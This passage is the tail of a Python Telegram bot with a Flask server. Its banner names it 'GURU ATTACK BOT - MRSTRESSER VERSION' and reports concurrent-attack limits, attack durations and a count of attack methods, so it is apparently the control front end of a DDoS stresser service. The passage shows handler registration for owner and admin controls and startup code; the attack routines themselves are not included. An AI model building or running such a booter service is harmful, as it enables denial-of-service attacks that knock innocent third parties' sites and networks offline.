    app.add_handler(CallbackQueryHandler(owner_ban_callback, pattern="^owner_ban$"))
    app.add_handler(CallbackQueryHandler(owner_unban_callback, pattern="^owner_unban$"))
    app.add_handler(CallbackQueryHandler(owner_list_admins_callback, pattern="^owner_list_admins$"))
    app.add_handler(CallbackQueryHandler(owner_list_users_callback, pattern="^owner_list_users$"))
    app.add_handler(CallbackQueryHandler(owner_api_status, pattern="^owner_api_status$"))
    app.add_handler(CallbackQueryHandler(process_demote, pattern="^demote_"))
    
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_router))
    
    loop.run_until_complete(app.initialize())
    loop.run_until_complete(app.start())
    loop.run_until_complete(app.updater.start_polling(allowed_updates=Update.ALL_TYPES))
    
    logger.info("✅ GURU Bot started!")
    loop.run_forever()

if __name__ == "__main__":
    print("=" * 50)
    print("👑 GURU ATTACK BOT - MRSTRESSER VERSION")
    print(f"⚡ TOTAL CONCURRENT: {MAX_TOTAL_CONCURRENT}")
    print(f"👤 FIRST 2 ATTACKS: {MAX_CONCURRENT_PER_USER_FIRST}x concurrent")
    print(f"👤 AFTER 2 ATTACKS: {MAX_CONCURRENT_PER_USER_LAST}x concurrent")
    print(f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s")
    print(f"📡 Methods: {len(ATTACK_METHODS)} methods")
    print("=" * 50)
    
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    logger.info("✅ Bot thread started")
    flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)